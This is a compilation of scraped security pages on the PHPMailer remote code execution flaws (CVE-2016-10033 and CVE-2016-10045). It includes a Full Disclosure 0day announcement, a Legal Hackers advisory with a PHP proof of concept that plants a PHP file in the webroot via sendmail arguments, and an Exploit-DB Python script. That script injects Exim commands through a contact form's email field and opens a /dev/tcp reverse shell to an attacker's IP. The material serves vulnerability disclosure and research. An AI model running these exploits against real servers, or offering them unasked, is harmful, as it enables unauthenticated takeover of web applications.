![PHPMailer](https://camo.githubusercontent.com/6d4a0a8d2ca2b19852106a326edc638c302cb7a4bfa3300f83993f5c278762ff/68747470733a2f2f7261772e6769746875622e636f6d2f5048504d61696c65722f5048504d61696c65722f6d61737465722f6578616d706c65732f696d616765732f7068706d61696c65722e706e67)

### Toggle table of contents Pages 17

* Loading

  [Home](/PHPMailer/PHPMailer/wiki)
* Loading

  [About the CVE 2016 10033 and CVE 2016 10045 vulnerabilities](/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities)
* Loading

  [Diagnosing email sending twice (or more)](/PHPMailer/PHPMailer/wiki/Diagnosing-email-sending-twice-%28or-more%29)
* Loading

  [Gmail XOAUTH smtp connect() failed. Trouble shooting](/PHPMailer/PHPMailer/wiki/Gmail-XOAUTH-smtp-connect%28%29-failed.-Trouble-shooting)
* Loading

  [Gmail XOAUTH2 Using Google API Client](/PHPMailer/PHPMailer/wiki/Gmail-XOAUTH2-Using-Google-API-Client)
* Loading

  [Improving delivery rates, avoiding spam filters](/PHPMailer/PHPMailer/wiki/Improving-delivery-rates%2C-avoiding-spam-filters)
* Loading

  [Microsoft Azure and XOAUTH2 setup guide](/PHPMailer/PHPMailer/wiki/Microsoft-Azure-and-XOAUTH2-setup-guide)
* Loading

  [Microsoft OAuth2 SMTP issues](/PHPMailer/PHPMailer/wiki/Microsoft-OAuth2-SMTP-issues)
* Loading

  [Overriding the SMTP class](/PHPMailer/PHPMailer/wiki/Overriding-the-SMTP-class)
* Loading

  [PHPMailer for enterprise](/PHPMailer/PHPMailer/wiki/PHPMailer-for-enterprise)
* Loading

  [Sending to lists](/PHPMailer/PHPMailer/wiki/Sending-to-lists)
* Loading

  [SMTP Debugging](/PHPMailer/PHPMailer/wiki/SMTP-Debugging)
* Loading

  [Troubleshooting](/PHPMailer/PHPMailer/wiki/Troubleshooting)
* Loading

  [TroubleshootingSMTP](/PHPMailer/PHPMailer/wiki/TroubleshootingSMTP)
* Loading

  [Tutorial](/PHPMailer/PHPMailer/wiki/Tutorial)
* Loading

  [Using Gmail with XOAUTH2](/PHPMailer/PHPMailer/wiki/Using-Gmail-with-XOAUTH2)
* Loading

  [Using PHPMailer in WordPress](/PHPMailer/PHPMailer/wiki/Using-PHPMailer-in-WordPress)
* Show 2 more pages…

[Add a custom sidebar](/PHPMailer/PHPMailer/wiki/_new?wiki%5Bname%5D=_Sidebar)
##### Clone this wiki locally

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seclists.org_bbbaa87d_20250125_054101.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](80)
[By Date](date.html#81)
[![Next](/images/right-icon-16x16.png)](82)

[![Previous](/images/left-icon-16x16.png)](80)
[By Thread](index.html#81)
[![Next](/images/right-icon-16x16.png)](84)

![](/shared/images/nst-icons.svg#search)

# PHPMailer < 5.2.20 Remote Code Execution PoC 0day Exploit (CVE-2016-10045) (Bypass of the CVE-2016-1033 patch)

---

*From*: Dawid Golunski <dawid () legalhackers com>

*Date*: Wed, 28 Dec 2016 04:18:24 -0200

---

```
PHPMailer < 5.2.20 Remote Code Execution PoC 0day Exploit
(CVE-2016-10045) (Bypass of the CVE-2016-1033 patch)

Discovered by Dawid Golunski (@dawid_golunski)
<https://legalhackers.com>

Desc:

I discovered that the current PHPMailer versions (< 5.2.20) were still
vulnerable to RCE as it is possible to bypass the currently available
patch.

This was reported responsibly to the vendor & assigned a CVEID on the
26th of December.
The vendor has been working on a new patch which would fix the problem but
not break the RFC too badly. The patch should be published very soon.

I'm releasing this as a 0day without the new patch available publicly
as a potential bypass was publicly discussed on oss-sec list with Solar
Designer in the PHPMailer < 5.2.18 thread, so holding the advisory
further would serve no purpose.

Current advisory URL:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

PoC exploit URL:
<https://legalhackers.com/exploits/CVE-2016-10045/PHPMailer_RCE_exploit.pl>

More updates soon at:

<https://twitter.com/dawid_golunski>

Stay tuned.

--
Regards,
Dawid Golunski
<https://legalhackers.com>
t: @dawid_golunski

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](80)
[By Date](date.html#81)
[![Next](/images/right-icon-16x16.png)](82)

[![Previous](/images/left-icon-16x16.png)](80)
[By Thread](index.html#81)
[![Next](/images/right-icon-16x16.png)](84)

### Current thread:

* **PHPMailer < 5.2.20 Remote Code Execution PoC 0day Exploit (CVE-2016-10045) (Bypass of the CVE-2016-1033 patch)** *Dawid Golunski (Dec 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.exploit-db.com_a4ac9c5f_20250125_054109.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution

#### EDB-ID:

###### 42221

#### CVE:

###### [2016-10074](https://nvd.nist.gov/vuln/detail/CVE-2016-10074) [2016-10045](https://nvd.nist.gov/vuln/detail/CVE-2016-10045) [2016-10034](https://nvd.nist.gov/vuln/detail/CVE-2016-10034) [2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

**EDB Verified:**

#### Author:

###### [phackt\_ul](/?author=8944)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-06-21

---

**Vulnerable App:**

```
#!/usr/bin/python
#
# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]
# Date: [16/06/2017]
# Exploit Author: [@phackt_ul]
# Software Link: [https://github.com/PHPMailer/PHPMailer]
# Version: [< 5.2.20]
# Tested on: [Debian x86/x64]
# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]
#
# @phackt_ul - https://phackt.com
#
# Find the last updated version here: https://raw.githubusercontent.com/phackt/pentest/master/exploits/rce_phpmailer_exim.py
#
# All credits go to Dawid Golunski (@dawid_golunski) - https://legalhackers.com
# and its research on PHP libraries vulns
#
# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent
#
#
# Disclaimer:
# For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum_PHPMailer_PoC_contactform.zip

import argparse
import urllib
import urllib2
import base64

# Prepare command for Exim expansion mode in order
def prepare_cmd(cmd):
    return '${run{${base64d:%s}}}' % base64.b64encode(cmd)

# Send Request method
def send_request(req):
    try:
        urllib2.urlopen(req)
    except urllib2.HTTPError, e:
        print "[!] Got HTTP error: [%d] when trying to reach " % e.code + req.get_full_url() + " - Check the URL!\n\n"
        exit(3)
    except urllib2.URLError, err:
        print "[!] Got the '%s' error when trying to reach " % str(err.reason) + req.get_full_url() + " - Check the URL!\n\n"
        exit(4)

# Parse input args
parser = argparse.ArgumentParser(prog='rce_phpmailer_exim4.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version')
parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url')
parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname')
parser.add_argument('-ip',  dest='ATTACKER_IP',    required=True,  help='Attacker IP for reverse shell')
parser.add_argument('-p',   dest='ATTACKER_PORT',  required=False, help='Attackers Port for reverse shell', default="8888")
parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
args = parser.parse_args()

CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL      = [%s]
CONTACT_SCRIPT       = [%s]
ATTACKER_IP          = [%s]
ATTACKER_PORT        = [%s]
POST_ACTION          = [%s]
POST_NAME            = [%s]
POST_EMAIL           = [%s]
POST_MSG             = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.ATTACKER_IP, args.ATTACKER_PORT, args.POST_ACTION, args.POST_NAME, args.POST_EMAIL, args.POST_MSG)

# Ask for mail library
print "[+] Choose your target / payload: "
print "\033[1;34m"
print "[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"
print "    SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"
print "    Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"
print "[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"
print "\033[0m"

try:
    target = int(raw_input('[?] Select target [1-2]: '))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)

if (target>2):
    print "No such target. Exiting\n"
    exit(3)

################################
# Payload
################################
cmd = "/bin/bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;nohup sh <&196 >&196 2>&196 &'" % (args.ATTACKER_IP, args.ATTACKER_PORT)
prepared_cmd = prepare_cmd(cmd)

payload = '"a\\" -be ' + prepared_cmd + ' "@a.co'

# Update payloads for PHPMailer bypass (PHPMailer < 5.2.20)
if target == 2:
    payload = "\"a\\' -be " + prepared_cmd + " \"@a.co"

################################
# Attack episode
# This step will execute the reverse shell
################################

# Form fields
post_fields = {'action': "%s" % args.POST_ACTION, "%s" % args.POST_NAME: 'Jas Fasola', "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: 'Really important message'}

# Print relevant information
print "\n[+] Executing command on victim server\n"
print '[!] command: [%s]' % cmd
print '[!] payload: [%s]' % payload
print '[!] post_fields: [%s]\n' % str(post_fields)

data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
send_request(req)

print "\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n"

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_1a7e2c59_20250125_054058.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from legalhackers.com_f5a1de07_20250126_062510.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10033
- Release date: 25.12.2016
- Last revision: 28.12.2016
- Revision 4.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

PHPMailer < 5.2.18 Remote Code Execution

II. BACKGROUND
-------------------------

"PHPMailer continues to be the world's most popular transport class, with an
estimated 9 million users worldwide. Downloads continue at a significant
pace daily."

<http://phpmailer.worxware.com/>

"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, [..],
Joomla! and many more"

<https://github.com/PHPMailer/PHPMailer>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.

Note: This revision (4.0) of the advisory, contains more information but
is still incomplete.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

PHPMailer class uses PHP mail() function as its default transport.

The transport is implemented using the function:

    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);

which essentially passes the arguments shown in the line:

$result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);

to the mail() function with the same set of parameters.

The parameters include the 5th parameter of $params which allows to pass extra
parameters to sendmail binary installed on the system as per PHP documentation
of mail() function:

<http://php.net/manual/en/function.mail.php>

As can we see from:

$params = sprintf('-f%s', $this->Sender);

PHPMailer uses the Sender variable to build the params string.

The Sender string is normally set with the use of setFrom() method.
which validates the Sender's address:

public function setFrom($address, $name = '', $auto = true)
{
$address = trim($address);
$name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
// Don't validate now addresses with IDN. Will be done in send().
if (($pos = strrpos($address, '@')) === false or
    (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and
    !$this->validateAddress($address)) {
...

The validation would for example reject an address as:

attacker -InjectedParam2 @attacker.com

which would prevent injection of additional parameters to Sendmail via the
mail() function.

Further research however shown that the validation is done using the RFC 3696 specification.

The RFC allows emails to contain spaces when quoted with ".
According to the spec, the following email address is valid:

" some test email address with spaces"@weird-email.com

The following Sender address:

"Attacker -Param2 -Param3"@test.com

would cause PHPMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

which would not work for the attacker (Param2 and Param3 are passed within
the same argument of argv[3] )

Attackers can however break out of parameter no.3 with some extra escaping.

For example, by injecting an extra sequence of \" after the first argument,
the following Sender email:

"Attacker \" -Param2 -Param3"@test.com

when passed to PHPMailer (and eventually to mail()) function would cause
sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

Discovered/Coded by:

Dawid Golunski (@dawid_golunski)
<https://legalhackers.com>

Full Advisory URL:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == [some"@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
The resulting file will contain the payload passed in the body of the msg:

09607 <<< --b1_cb4566aa51be9f090d9419163e492306
09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<
09607 <<< --b1_cb4566aa51be9f090d9419163e492306--

See the full advisory URL for details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php  some"@email.com';
$msg_body  = "<?php phpinfo(); ?>";

// ------------------

// mail() param injection via the vulnerability in PHPMailer

require_once('class.phpmailer.php');
$mail = new PHPMailer(); // defaults to using php "mail()"

$mail->SetFrom($email_from, 'Client Name');

$address = "customer_feedback@company-X.com";
$mail->AddAddress($address, "Some User");

$mail->Subject    = "PHPMailer PoC Exploit CVE-2016-10033";
$mail->MsgHTML($msg_body);

if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
